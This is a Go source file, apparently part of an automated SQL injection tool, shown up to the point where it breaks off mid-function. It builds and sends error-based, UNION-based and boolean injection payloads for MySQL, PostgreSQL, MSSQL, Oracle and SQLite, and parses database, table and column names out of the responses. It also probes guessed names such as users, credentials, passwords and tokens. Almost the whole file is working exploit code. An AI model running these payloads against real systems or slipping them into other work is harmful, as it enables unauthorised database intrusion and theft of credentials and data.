package modules

import (
	"fmt"
	"regexp"
	"strings"
)

type Enumerator struct {
	Engine EngineInterface
}

func NewEnumerator(e EngineInterface) *Enumerator {
	return &Enumerator{Engine: e}
}

type extractStrategy int

const (
	strategyMarker extractStrategy = iota
	strategyErrorMsg
	strategyRegexBody
	strategyKnownName
	strategyAll
)

func isValidName(name string) bool {
	if len(name) < 1 || len(name) > 64 {
		return false
	}
	badChars := []string{":", "@", "~", "/", "\\", " ", "`", "'", "\"", "\n", "\r"}
	for _, c := range badChars {
		if strings.Contains(name, c) {
			return false
		}
	}
	sqlKeywords := []string{"select", "union", "from", "where", "limit", "order", "group",
		"having", "insert", "into", "values", "delete", "update", "set", "create",
		"drop", "alter", "and", "or", "not", "null", "true", "false", "case", "when",
		"then", "else", "end", "as", "on", "join", "inner", "left", "right", "outer",
		"cross", "like", "in", "between", "exists", "is", "all", "any", "some",
		"distinct", "count", "sum", "avg", "min", "max", "cast", "convert",
		"substring", "replace", "concat", "group_concat", "length", "char",
		"ascii", "hex", "unhex", "information_schema", "performance_schema",
		"mysql", "sys"}
	for _, kw := range sqlKeywords {
		if strings.EqualFold(name, kw) {
			return true
		}
	}
	for _, r := range name {
		if (r < 'a' || r > 'z') && (r < 'A' || r > 'Z') && (r < '0' || r > '9') && r != '_' {
			return false
		}
	}
	return true
}

func (en *Enumerator) extractData(body string, strategies []extractStrategy) []string {
	var results []string

	for _, strat := range strategies {
		switch strat {
		case strategyMarker:
			if strings.Contains(body, "~") {
				re := regexp.MustCompile(`~([^~]+)~`)
				matches := re.FindAllStringSubmatch(body, -1)
				for _, m := range matches {
					if len(m) > 1 && m[1] != "" {
						parts := strings.Split(m[1], ",")
						for _, p := range parts {
							p = strings.TrimSpace(p)
							if p != "" && !contains(results, p) && isValidName(p) {
								results = append(results, p)
							}
						}
					}
				}
			}

		case strategyErrorMsg:
			patterns := []struct {
				re   *regexp.Regexp
				idx  int
			}{
				{regexp.MustCompile(`Duplicate\s+entry\s+'([^']+)'`), 1},
				{regexp.MustCompile(`Column\s+'([^']+)'`), 1},
				{regexp.MustCompile(`Table\s+'([^']+)'`), 1},
				{regexp.MustCompile(`Database\s+'([^']+)'`), 1},
				{regexp.MustCompile(`for\s+key\s+'([^']+)'`), 1},
				{regexp.MustCompile(`at\s+or\s+near\s+'([^']+)'`), 1},
				{regexp.MustCompile(`integer:\s+"([^"]+)"`), 1},
				{regexp.MustCompile(`value\s+'([^']+)'\s+to`), 1},
				{regexp.MustCompile(`unknown\s+'([^']+)'`), 1},
				{regexp.MustCompile(`'([^']+)'\s+is\s+not\s+valid`), 1},
				{regexp.MustCompile(`doesn't\s+exist:\s+([^\s]+)`), 1},
				{regexp.MustCompile(`relation\s+"([^"]+)"`), 1},
				{regexp.MustCompile(`schema\s+'([^']+)'`), 1},
				{regexp.MustCompile(`Unknown\s+column\s+'([^']+)'`), 1},
				{regexp.MustCompile(`unknown\s+database\s+'([^']+)'`), 1},
			}
			for _, p := range patterns {
				matches := p.re.FindAllStringSubmatch(body, -1)
				for _, m := range matches {
					if len(m) > p.idx && m[p.idx] != "" {
						val := m[p.idx]
						if !contains(results, val) && isValidName(val) {
							results = append(results, val)
						}
					}
				}
			}

		case strategyRegexBody:
			re := regexp.MustCompile(`(?i)(?:database|schema|table|column)\s*[:=]\s*['"]?([a-zA-Z_][a-zA-Z0-9_]+)['"]?`)
			matches := re.FindAllStringSubmatch(body, -1)
			for _, m := range matches {
				if len(m) > 1 {
					kw := strings.ToLower(m[1])
					skip := "select|union|from|where|limit|order|group|having|insert|into|values|delete|update|set|create|drop|alter|and|or|not|null|true|false|case|when|then|else|end|as|on|join|inner|left|right|outer|cross|like|in|between|exists|is|all|any|some|distinct|count|sum|avg|min|max|cast|convert|substring|replace|concat|group_concat|length|char|ascii|hex|unhex"
					if !splitStr(kw, skip) && len(m[1]) > 1 && len(m[1]) < 48 {
						if !contains(results, m[1]) && isValidName(m[1]) {
							results = append(results, m[1])
						}
					}
				}
			}
		}
	}

	return results
}

func unionVariants(quote, comment, colExpr, fromClause string) []string {
	colCounts := []int{1, 3, 5, 7, 9}
	prefixes := []string{" UNION SELECT ", " UNION ALL SELECT "}
	var results []string
	for _, cols := range colCounts {
		positions := []int{0}
		if cols > 1 {
			positions = append(positions, cols/2, cols-1)
		}
		for _, pos := range positions {
			nulls := make([]string, cols)
			for i := range nulls {
				nulls[i] = "NULL"
			}
			if pos < cols {
				nulls[pos] = colExpr
			}
			sel := strings.Join(nulls, ",")
			for _, pref := range prefixes {
				results = append(results,
					fmt.Sprintf("%s%s%s %s%s", quote, pref, sel, fromClause, comment))
			}
		}
	}
	return results
}

func (en *Enumerator) tryPayloads(payloads []string, vulnParam string, strategies []extractStrategy) []string {
	var results []string
	for _, p := range payloads {
		body, _, _, err := en.Engine.Request(p, vulnParam)
		if err != nil {
			continue
		}
		extracted := en.extractData(body, strategies)
		for _, e := range extracted {
			if !contains(results, e) {
				results = append(results, e)
			}
		}
	}
	return results
}

func (en *Enumerator) ListDatabases(vulnParam string, dbms string) ([]string, error) {
	en.Engine.GetLogger().Info(fmt.Sprintf("Enumerating databases for %s...", dbms))
	var databases []string

	// Phase 1: Try GROUP_CONCAT/aggregate (fastest — single request)
	dbs := en.tryAggregateDatabases(vulnParam, dbms)
	databases = append(databases, dbs...)

	// Phase 2: Row-by-row with multiple strategies
	dbs = en.tryRowByRowDatabases(vulnParam, dbms)
	for _, db := range dbs {
		if !contains(databases, db) {
			databases = append(databases, db)
		}
	}

	// Phase 3: Current database info
	dbs = en.tryCurrentDB(vulnParam, dbms)
	for _, db := range dbs {
		if !contains(databases, db) {
			databases = append(databases, db)
		}
	}

	// Phase 4: Fallback — common names if nothing found
	if len(databases) == 0 {
		en.Engine.GetLogger().Warning("No databases found through injection, trying common names...")
		common := en.tryCommonDBNames(vulnParam, dbms)
		databases = append(databases, common...)
	}

	if len(databases) == 0 {
		return nil, fmt.Errorf("could not enumerate databases")
	}

	en.Engine.GetLogger().Success(fmt.Sprintf("Found %d database(s): %s", len(databases), strings.Join(databases, ", ")))
	return databases, nil
}

func (en *Enumerator) tryAggregateDatabases(vulnParam string, dbms string) []string {
	var results []string
	strategies := []extractStrategy{strategyMarker, strategyErrorMsg, strategyRegexBody}

	switch dbms {
	case "MySQL", "MariaDB":
		payloads := []string{
			"' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(DISTINCT schema_name SEPARATOR 0x2c) FROM information_schema.schemata),0x7e))-- -",
			" AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(DISTINCT schema_name SEPARATOR 0x2c) FROM information_schema.schemata),0x7e))-- -",
			"' AND updatexml(1,concat(0x7e,(SELECT GROUP_CONCAT(DISTINCT schema_name SEPARATOR 0x2c) FROM information_schema.schemata),0x7e),1)-- -",
			"' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT GROUP_CONCAT(DISTINCT schema_name SEPARATOR 0x2c) FROM information_schema.schemata), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.plugins GROUP BY x)a)-- -",
		}
		payloads = append(payloads, unionVariants("'", "-- -",
			"GROUP_CONCAT(DISTINCT schema_name SEPARATOR 0x2c)",
			"FROM information_schema.schemata")...)
		results = en.tryPayloads(payloads, vulnParam, strategies)
	case "PostgreSQL":
		payloads := []string{
			"' AND CAST((SELECT string_agg(DISTINCT datname, ',') FROM pg_database) AS INT)=1-- -",
		}
		payloads = append(payloads, unionVariants("'", "-- -",
			"string_agg(DISTINCT datname, ',')",
			"FROM pg_database")...)
		results = en.tryPayloads(payloads, vulnParam, strategies)
	case "MSSQL":
		payloads := []string{
			"' AND 1=CONVERT(int,(SELECT STRING_AGG(name,',') FROM sys.databases))-- -",
		}
		payloads = append(payloads, unionVariants("'", "-- -",
			"STRING_AGG(name,',')",
			"FROM sys.databases")...)
		results = en.tryPayloads(payloads, vulnParam, strategies)
	case "Oracle":
		payloads := []string{
			"' AND 1=utl_inaddr.get_host_name((SELECT LISTAGG(DISTINCT owner, ',') WITHIN GROUP (ORDER BY 1) FROM all_tables))-- -",
		}
		payloads = append(payloads, unionVariants("'", "-- -",
			"LISTAGG(DISTINCT owner, ',') WITHIN GROUP (ORDER BY 1)",
			"FROM all_tables")...)
		results = en.tryPayloads(payloads, vulnParam, strategies)
	case "SQLite":
		payloads := unionVariants("'", "-- -",
			"GROUP_CONCAT(DISTINCT name)",
			"FROM pragma_database_list")
		results = en.tryPayloads(payloads, vulnParam, strategies)
	}

	return results
}

func (en *Enumerator) tryRowByRowDatabases(vulnParam string, dbms string) []string {
	var databases []string
	strategies := []extractStrategy{strategyMarker, strategyErrorMsg, strategyRegexBody}
	maxRows := 50

	switch dbms {
	case "MySQL", "MariaDB":
		payloadTemplates := []string{
			"' AND extractvalue(1,concat(0x7e,(SELECT schema_name FROM information_schema.schemata LIMIT %d,1),0x7e))-- -",
			" AND extractvalue(1,concat(0x7e,(SELECT schema_name FROM information_schema.schemata LIMIT %d,1),0x7e))-- -",
			"' AND updatexml(1,concat(0x7e,(SELECT schema_name FROM information_schema.schemata LIMIT %d,1),0x7e),1)-- -",
			"' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT schema_name FROM information_schema.schemata LIMIT %d,1), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.plugins GROUP BY x)a)-- -",
		}
		unionTemplates := unionVariants("'", "-- -",
			"schema_name",
			"FROM information_schema.schemata LIMIT __OFFSET__,1")
		for _, ut := range unionTemplates {
			payloadTemplates = append(payloadTemplates, strings.ReplaceAll(ut, "__OFFSET__", "%d"))
		}
		for _, t := range payloadTemplates {
			for i := 0; i < maxRows; i++ {
				payload := fmt.Sprintf(t, i)
				body, _, _, err := en.Engine.Request(payload, vulnParam)
				if err != nil {
					continue
				}
				extracted := en.extractData(body, strategies)
				added := false
				for _, e := range extracted {
					if e != "" && !contains(databases, e) {
						databases = append(databases, e)
						added = true
					}
				}
				if !added {
					if strings.Contains(body, "~") {
						continue
					}
					// Try blind boolean check for common dbs
					break
				}
			}
			if len(databases) > 0 {
				break
			}
		}

	case "PostgreSQL":
		payloadTemplates := []string{
			"' AND CAST((SELECT datname FROM pg_database LIMIT 1 OFFSET %d) AS INT)=1-- -",
			"' AND (SELECT COUNT(*) FROM (SELECT 1 FROM pg_database WHERE datname=(SELECT datname FROM pg_database LIMIT 1 OFFSET %d))x)>0-- -",
		}
		unionTemplates := unionVariants("'", "-- -",
			"datname",
			"FROM pg_database LIMIT 1 OFFSET __OFFSET__")
		for _, ut := range unionTemplates {
			payloadTemplates = append(payloadTemplates, strings.ReplaceAll(ut, "__OFFSET__", "%d"))
		}
		for _, t := range payloadTemplates {
			consecutiveEmpty := 0
			for i := 0; i < maxRows; i++ {
				payload := fmt.Sprintf(t, i)
				body, _, _, err := en.Engine.Request(payload, vulnParam)
				if err != nil {
					consecutiveEmpty++
					if consecutiveEmpty > 3 {
						break
					}
					continue
				}
				consecutiveEmpty = 0
				extracted := en.extractData(body, strategies)
				for _, e := range extracted {
					if e != "" && !contains(databases, e) {
						databases = append(databases, e)
					}
				}
			}
			if len(databases) > 0 {
				break
			}
		}

	case "MSSQL":
		payloadTemplates := []string{
			"' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sys.databases WHERE name NOT IN (SELECT TOP %d name FROM sys.databases)))-- -",
			"' AND 1=CONVERT(int, (SELECT TOP 1 DB_NAME(%d)))-- -",
		}
		unionTemplates := unionVariants("'", "-- -",
			"name",
			"FROM sys.databases ORDER BY name OFFSET __OFFSET__ ROWS FETCH NEXT 1 ROWS ONLY")
		for _, ut := range unionTemplates {
			payloadTemplates = append(payloadTemplates, strings.ReplaceAll(ut, "__OFFSET__", "%d"))
		}
		for _, t := range payloadTemplates {
			consecutiveEmpty := 0
			for i := 0; i < maxRows; i++ {
				payload := fmt.Sprintf(t, i)
				body, _, _, err := en.Engine.Request(payload, vulnParam)
				if err != nil {
					consecutiveEmpty++
					if consecutiveEmpty > 3 {
						break
					}
					continue
				}
				consecutiveEmpty = 0
				extracted := en.extractData(body, strategies)
				for _, e := range extracted {
					if e != "" && !contains(databases, e) {
						databases = append(databases, e)
					}
				}
			}
			if len(databases) > 0 {
				break
			}
		}

	case "Oracle":
		payloadTemplates := []string{
			"' AND 1=utl_inaddr.get_host_name((SELECT owner FROM (SELECT owner, ROWNUM r FROM all_tables) WHERE r=%d))-- -",
		}
		unionTemplates := unionVariants("'", "-- -",
			"owner",
			"FROM (SELECT owner, ROWNUM r FROM all_tables WHERE ROWNUM <= __OFFSET__) WHERE r > __OFFSET2__")
		for _, ut := range unionTemplates {
			t := strings.ReplaceAll(ut, "__OFFSET__", "%d")
			t = strings.ReplaceAll(t, "__OFFSET2__", "%d")
			payloadTemplates = append(payloadTemplates, t)
		}
		for _, t := range payloadTemplates {
			for i := 1; i <= maxRows; i++ {
				payload := fmt.Sprintf(t, i, i-1)
				if strings.Count(t, "%d") == 1 {
					payload = fmt.Sprintf(t, i)
				}
				body, _, _, err := en.Engine.Request(payload, vulnParam)
				if err != nil {
					continue
				}
				extracted := en.extractData(body, strategies)
				for _, e := range extracted {
					if e != "" && !contains(databases, e) {
						databases = append(databases, e)
					}
				}
			}
			if len(databases) > 0 {
				break
			}
		}

	case "SQLite":
		var payloadTemplates []string
		unionTemplates := unionVariants("'", "-- -",
			"name",
			"FROM pragma_database_list LIMIT 1 OFFSET __OFFSET__")
		for _, ut := range unionTemplates {
			payloadTemplates = append(payloadTemplates, strings.ReplaceAll(ut, "__OFFSET__", "%d"))
		}
		for _, t := range payloadTemplates {
			for i := 0; i < maxRows; i++ {
				payload := fmt.Sprintf(t, i)
				body, _, _, err := en.Engine.Request(payload, vulnParam)
				if err != nil {
					continue
				}
				extracted := en.extractData(body, strategies)
				for _, e := range extracted {
					if e != "" && !contains(databases, e) {
						databases = append(databases, e)
					}
				}
			}
			if len(databases) > 0 {
				break
			}
		}
	}

	return databases
}

func (en *Enumerator) tryCurrentDB(vulnParam string, dbms string) []string {
	strategies := []extractStrategy{strategyMarker, strategyErrorMsg, strategyRegexBody}
	var payloads []string

	switch dbms {
	case "MySQL", "MariaDB":
		payloads = []string{
			"' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))-- -",
			"' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT database()), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.plugins GROUP BY x)a)-- -",
			"' UNION SELECT NULL,database(),NULL-- -",
			"' UNION SELECT database(),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -",
		}
	case "PostgreSQL":
		payloads = []string{
			"' UNION SELECT NULL,current_database(),NULL,NULL-- -",
			"' AND CAST((SELECT current_database() AS INT)=1-- -",
		}
	case "MSSQL":
		payloads = []string{
			"' UNION SELECT NULL,DB_NAME(),NULL-- -",
			"' AND 1=CONVERT(int,(SELECT DB_NAME()))-- -",
		}
	case "Oracle":
		payloads = []string{
			"' UNION SELECT NULL,ora_database_name,NULL FROM dual-- -",
		}
	case "SQLite":
		payloads = []string{
			"' UNION SELECT NULL,'sqlite',NULL-- -",
		}
	}

	return en.tryPayloads(payloads, vulnParam, strategies)
}

func (en *Enumerator) tryCommonDBNames(vulnParam string, dbms string) []string {
	common := []string{
		"information_schema", "mysql", "performance_schema", "sys",
		"test", "phpmyadmin", "wordpress", "joomla", "drupal",
		"acuart", "dvwa", "bwapp", "mutillidae",
		"postgres", "template1", "template0",
		"master", "tempdb", "model", "msdb",
		"XEPDB1", "XE", "SYSTEM", "SYSAUX", "USERS",
	}

	var found []string
	for _, db := range common {
		if en.testDBExists(vulnParam, db, dbms) {
			found = append(found, db)
		}
	}
	return found
}

func (en *Enumerator) testDBExists(vulnParam, dbName, dbms string) bool {
	var payload string
	switch dbms {
	case "MySQL", "MariaDB":
		payload = fmt.Sprintf("' AND (SELECT COUNT(*) FROM information_schema.schemata WHERE schema_name='%s')>0-- -", dbName)
	case "PostgreSQL":
		payload = fmt.Sprintf("' AND (SELECT COUNT(*) FROM pg_database WHERE datname='%s')>0-- -", dbName)
	case "MSSQL":
		payload = fmt.Sprintf("' AND (SELECT COUNT(*) FROM sys.databases WHERE name='%s')>0-- -", dbName)
	case "SQLite":
		payload = fmt.Sprintf("' AND (SELECT COUNT(*) FROM pragma_database_list WHERE name='%s')>0-- -", dbName)
	default:
		return false
	}

	body, blen, _, err := en.Engine.Request(payload, vulnParam)
	if err != nil {
		return false
	}
	_ = blen
	return strings.Contains(body, "1") || strings.Contains(body, ">0")
}

func (en *Enumerator) ListTables(db string, vulnParam string, dbms string) ([]string, error) {
	en.Engine.GetLogger().Info(fmt.Sprintf("Enumerating tables for %s on %s...", dbms, db))
	var tables []string

	if db == "" || db == "current" {
		db = "current"
	}

	strategies := []extractStrategy{strategyMarker, strategyErrorMsg, strategyRegexBody}

	// Phase 1: GROUP_CONCAT/aggregate
	tables = en.tryAggregateTables(db, vulnParam, dbms, strategies)

	// Phase 2: Row-by-row
	if len(tables) == 0 {
		tables = en.tryRowByRowTables(db, vulnParam, dbms, strategies)
	}

	// Phase 3: Common names
	if len(tables) == 0 {
		en.Engine.GetLogger().Warning("No tables found via injection, trying common names...")
		tables = en.tryCommonTableNames(vulnParam, db, dbms)
	}

	if len(tables) == 0 {
		return nil, fmt.Errorf("could not enumerate tables for '%s'", db)
	}

	en.Engine.GetLogger().Success(fmt.Sprintf("Found %d table(s) in %s: %s", len(tables), db, strings.Join(tables, ", ")))
	return tables, nil
}

func (en *Enumerator) tryAggregateTables(db, vulnParam, dbms string, strategies []extractStrategy) []string {
	var results []string

	switch dbms {
	case "MySQL", "MariaDB":
		escDB := db
		if db == "current" {
			payloads := []string{
				"' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(DISTINCT table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema=database()),0x7e))-- -",
				"' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT GROUP_CONCAT(DISTINCT table_name SEPARATOR ','), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.tables WHERE table_schema=database()) GROUP BY x)a)-- -",
			}
			payloads = append(payloads, unionVariants("'", "-- -",
				"GROUP_CONCAT(DISTINCT table_name SEPARATOR ',')",
				"FROM information_schema.tables WHERE table_schema=database()")...)
			results = en.tryPayloads(payloads, vulnParam, strategies)
		} else {
			payloads := []string{
				fmt.Sprintf("' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(DISTINCT table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema='%s'),0x7e))-- -", escDB),
				fmt.Sprintf("' AND updatexml(1,concat(0x7e,(SELECT GROUP_CONCAT(DISTINCT table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema='%s'),0x7e),1)-- -", escDB),
				fmt.Sprintf("' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT GROUP_CONCAT(DISTINCT table_name SEPARATOR ','), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.tables WHERE table_schema='%s') GROUP BY x)a)-- -", escDB),
			}
			payloads = append(payloads, unionVariants("'", "-- -",
				"GROUP_CONCAT(DISTINCT table_name SEPARATOR ',')",
				fmt.Sprintf("FROM information_schema.tables WHERE table_schema='%s'", escDB))...)
			results = en.tryPayloads(payloads, vulnParam, strategies)
		}

	case "PostgreSQL":
		payloads := []string{
			"' AND CAST((SELECT string_agg(DISTINCT tablename, ',') FROM pg_catalog.pg_tables WHERE schemaname='public') AS INT)=1-- -",
		}
		payloads = append(payloads, unionVariants("'", "-- -",
			"string_agg(DISTINCT tablename, ',')",
			"FROM pg_catalog.pg_tables WHERE schemaname='public'")...)
		if db != "current" && db != "" {
			payloads = append(payloads, unionVariants("'", "-- -",
				"string_agg(DISTINCT tablename, ',')",
				fmt.Sprintf("FROM pg_catalog.pg_tables WHERE tableowner='%s'", db))...)
		}
		results = en.tryPayloads(payloads, vulnParam, strategies)

	case "MSSQL":
		payloads := []string{
			"' AND 1=CONVERT(int,(SELECT STRING_AGG(name,',') FROM sysobjects WHERE xtype='U'))-- -",
		}
		payloads = append(payloads, unionVariants("'", "-- -",
			"STRING_AGG(name,',')",
			"FROM sysobjects WHERE xtype='U'")...)
		if db != "current" && db != "" && !contains([]string{"master", "tempdb", "model", "msdb"}, strings.ToLower(db)) {
			payloads = append(payloads, unionVariants("'", "-- -",
				"STRING_AGG(name,',')",
				fmt.Sprintf("FROM %s.sysobjects WHERE xtype='U'", db))...)
		}
		results = en.tryPayloads(payloads, vulnParam, strategies)

	case "Oracle":
		var payloads []string
		payloads = append(payloads, unionVariants("'", "-- -",
			"LISTAGG(DISTINCT table_name, ',') WITHIN GROUP (ORDER BY 1)",
			"FROM all_tables WHERE owner=user")...)
		payloads = append(payloads, unionVariants("'", "-- -",
			"LISTAGG(DISTINCT table_name, ',') WITHIN GROUP (ORDER BY 1)",
			"FROM user_tables")...)
		results = en.tryPayloads(payloads, vulnParam, strategies)

	case "SQLite":
		var payloads []string
		payloads = append(payloads, unionVariants("'", "-- -",
			"GROUP_CONCAT(DISTINCT name)",
			"FROM sqlite_master WHERE type='table'")...)
		results = en.tryPayloads(payloads, vulnParam, strategies)
	}

	return results
}

func (en *Enumerator) tryRowByRowTables(db, vulnParam, dbms string, strategies []extractStrategy) []string {
	var tables []string
	maxRows := 100

	tableRef := db
	if db == "current" || db == "" {
		tableRef = "current"
	}

	switch dbms {
	case "MySQL", "MariaDB":
		var payloadTemplates []string
		if tableRef == "current" {
			payloadTemplates = []string{
				"' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT %d,1),0x7e))-- -",
			}
			unionTemplates := unionVariants("'", "-- -",
				"table_name",
				"FROM information_schema.tables WHERE table_schema=database() LIMIT __OFFSET__,1")
			for _, ut := range unionTemplates {
				payloadTemplates = append(payloadTemplates, strings.ReplaceAll(ut, "__OFFSET__", "%d"))
			}
		} else {
			escDB := db
			payloadTemplates = []string{
				fmt.Sprintf("' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema='%s' LIMIT %%d,1),0x7e))-- -", escDB),
			}
			unionTemplates := unionVariants("'", "-- -",
				"table_name",
				fmt.Sprintf("FROM information_schema.tables WHERE table_schema='%s' LIMIT __OFFSET__,1", escDB))
			for _, ut := range unionTemplates {
				payloadTemplates = append(payloadTemplates, strings.ReplaceAll(ut, "__OFFSET__", "%d"))
			}
		}

		for _, t := range payloadTemplates {
			consecutiveEmpty := 0
			for i := 0; i < maxRows; i++ {
				payload := fmt.Sprintf(t, i)
				body, _, _, err := en.Engine.Request(payload, vulnParam)
				if err != nil {
					consecutiveEmpty++
					if consecutiveEmpty > 3 {
						break
					}
					continue
				}
				consecutiveEmpty = 0
				extracted := en.extractData(body, strategies)
				for _, e := range extracted {
					if e != "" && !contains(tables, e) {
						tables = append(tables, e)
					}
				}
			}
			if len(tables) > 0 {
				break
			}
		}

	case "PostgreSQL":
		payloadTemplates := []string{
			"' AND CAST((SELECT tablename FROM pg_catalog.pg_tables WHERE schemaname='public' LIMIT 1 OFFSET %d) AS INT)=1-- -",
		}
		unionTemplates := unionVariants("'", "-- -",
			"tablename",
			"FROM pg_catalog.pg_tables WHERE schemaname='public' LIMIT 1 OFFSET __OFFSET__")
		for _, ut := range unionTemplates {
			payloadTemplates = append(payloadTemplates, strings.ReplaceAll(ut, "__OFFSET__", "%d"))
		}
		for _, t := range payloadTemplates {
			for i := 0; i < maxRows; i++ {
				payload := fmt.Sprintf(t, i)
				body, _, _, err := en.Engine.Request(payload, vulnParam)
				if err != nil {
					continue
				}
				extracted := en.extractData(body, strategies)
				for _, e := range extracted {
					if e != "" && !contains(tables, e) {
						tables = append(tables, e)
					}
				}
			}
			if len(tables) > 0 {
				break
			}
		}

	case "MSSQL":
		payloadTemplates := []string{
			"' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects WHERE xtype='U' AND name NOT IN (SELECT TOP %d name FROM sysobjects WHERE xtype='U')))-- -",
		}
		unionTemplates := unionVariants("'", "-- -",
			"name",
			"FROM sysobjects WHERE xtype='U' ORDER BY name OFFSET __OFFSET__ ROWS FETCH NEXT 1 ROWS ONLY")
		for _, ut := range unionTemplates {
			payloadTemplates = append(payloadTemplates, strings.ReplaceAll(ut, "__OFFSET__", "%d"))
		}
		for _, t := range payloadTemplates {
			for i := 0; i < maxRows; i++ {
				payload := fmt.Sprintf(t, i)
				body, _, _, err := en.Engine.Request(payload, vulnParam)
				if err != nil {
					continue
				}
				extracted := en.extractData(body, strategies)
				for _, e := range extracted {
					if e != "" && !contains(tables, e) {
						tables = append(tables, e)
					}
				}
			}
			if len(tables) > 0 {
				break
			}
		}

	case "Oracle":
		var payloadTemplates []string
		unionTemplates := unionVariants("'", "-- -",
			"table_name",
			"FROM (SELECT table_name, ROWNUM r FROM user_tables) WHERE r BETWEEN __START__ AND __END__")
		for _, ut := range unionTemplates {
			t := strings.ReplaceAll(ut, "__START__", "%d")
			t = strings.ReplaceAll(t, "__END__", "%d")
			payloadTemplates = append(payloadTemplates, t)
		}
		// Batch of 5
		for _, t := range payloadTemplates {
			for i := 1; i < maxRows; i += 5 {
				payload := fmt.Sprintf(t, i, i+4)
				body, _, _, err := en.Engine.Request(payload, vulnParam)
				if err != nil {
					continue
				}
				extracted := en.extractData(body, strategies)
				for _, e := range extracted {
					if e != "" && !contains(tables, e) {
						tables = append(tables, e)
					}
				}
			}
		}

	case "SQLite":
		var payloadTemplates []string
		unionTemplates := unionVariants("'", "-- -",
			"name",
			"FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET __OFFSET__")
		for _, ut := range unionTemplates {
			payloadTemplates = append(payloadTemplates, strings.ReplaceAll(ut, "__OFFSET__", "%d"))
		}
		for _, t := range payloadTemplates {
			for i := 0; i < maxRows; i++ {
				payload := fmt.Sprintf(t, i)
				body, _, _, err := en.Engine.Request(payload, vulnParam)
				if err != nil {
					continue
				}
				extracted := en.extractData(body, strategies)
				for _, e := range extracted {
					if e != "" && !contains(tables, e) {
						tables = append(tables, e)
					}
				}
			}
			if len(tables) > 0 {
				break
			}
		}
	}

	return tables
}

func (en *Enumerator) tryCommonTableNames(vulnParam, db, dbms string) []string {
	common := []string{
		"users", "user", "admin", "accounts", "members", "staff",
		"customers", "clients", "employees", "profiles", "login",
		"credentials", "passwords", "secrets", "tokens", "sessions",
		"config", "configuration", "settings", "options",
		"wp_users", "wp_options", "wp_posts",
		"articles", "posts", "content", "pages",
		"products", "orders", "cart", "payments", "transactions",
		"logs", "audit", "activity", "history",
		"flags", "flag", "challenges", "scores",
	}
	var found []string
	for _, t := range common {
		if en.testTableExists(vulnParam, t, db, dbms) {
			found = append(found, t)
		}
	}
	return found
}

func (en *Enumerator) testTableExists(vulnParam, tableName, db, dbms string) bool {
	var payload string
	switch dbms {
	case "MySQL", "MariaDB":
		dbref := "database()"
		if db != "" && db != "current" {
			dbref = fmt.Sprintf("'%s'", db)
		}
		payload = fmt.Sprintf("' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=%s AND table_name='%s')>0-- -", dbref, tableName)
	case "PostgreSQL":
		payload = fmt.Sprintf("' AND (SELECT COUNT(*) FROM pg_catalog.pg_tables WHERE tablename='%s')>0-- -", tableName)
	case "MSSQL":
		payload = fmt.Sprintf("' AND (SELECT COUNT(*) FROM sysobjects WHERE name='%s' AND xtype='U')>0-- -", tableName)
	case "SQLite":
		payload = fmt.Sprintf("' AND (SELECT COUNT(*) FROM sqlite_master WHERE name='%s' AND type='table')>0-- -", tableName)
	default:
		return false
	}

	body, _, _, err := en.Engine.Request(payload, vulnParam)
	if err != nil {
		return false
	}
	return strings.Contains(body, "1") || strings.Contains(body, ">0")
}

func (en *Enumerator) ListColumns(db, table string, vulnParam string, dbms string) ([]string, error) {
	en.Engine.GetLogger().Info(fmt.Sprintf("Enumerating columns for %s.%s on %s...", db, table, dbms))
	var columns []string

	if db == "" || db == "current" {
		db = "current"
	}

	strategies := []extractStrategy{strategyMarker, strategyErrorMsg, strategyRegexBody}

	// Phase 1: GROUP_CONCAT
	columns = en.tryAggregateColumns(db, table, vulnParam, dbms, strategies)

	// Phase 2: Row-by-row
	if len(columns) == 0 {
		columns = en.tryRowByRowColumns(db, table, vulnParam, dbms, strategies)
	}

	// Phase 3: Common column names
	if len(columns) == 0 {
		en.Engine.GetLogger().Warning(fmt.Sprintf("No columns found for %s, trying common names...", table))
		columns = en.tryCommonColumnNames(vulnParam, table, db, dbms)
	}

	if len(columns) == 0 {
		return nil, fmt.Errorf("could not enumerate columns for %s.%s", db, table)
	}

	en.Engine.GetLogger().Success(fmt.Sprintf("Found %d column(s) in %s.%s: %s", len(columns), db, table, strings.Join(columns, ", ")))
	return columns, nil
}

func (en *Enumerator) tryAggregateColumns(db, table, vulnParam, dbms string, strategies []extractStrategy) []string {
	var results []string

	switch dbms {
	case "MySQL", "MariaDB":
		var payloads []string
		if db == "current" {
			payloads = []string{
				fmt.Sprintf("' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(DISTINCT column_name SEPARATOR ',') FROM information_schema.columns WHERE table_name='%s' AND table_schema=database()),0x7e))-- -", table),
				fmt.Sprintf("' AND updatexml(1,concat(0x7e,(SELECT GROUP_CONCAT(DISTINCT column_name SEPARATOR ',') FROM information_schema.columns WHERE table_name='%s' AND table_schema=database()),0x7e),1)-- -", table),
			}
			payloads = append(payloads, unionVariants("'", "-- -",
				"GROUP_CONCAT(DISTINCT column_name SEPARATOR ',')",
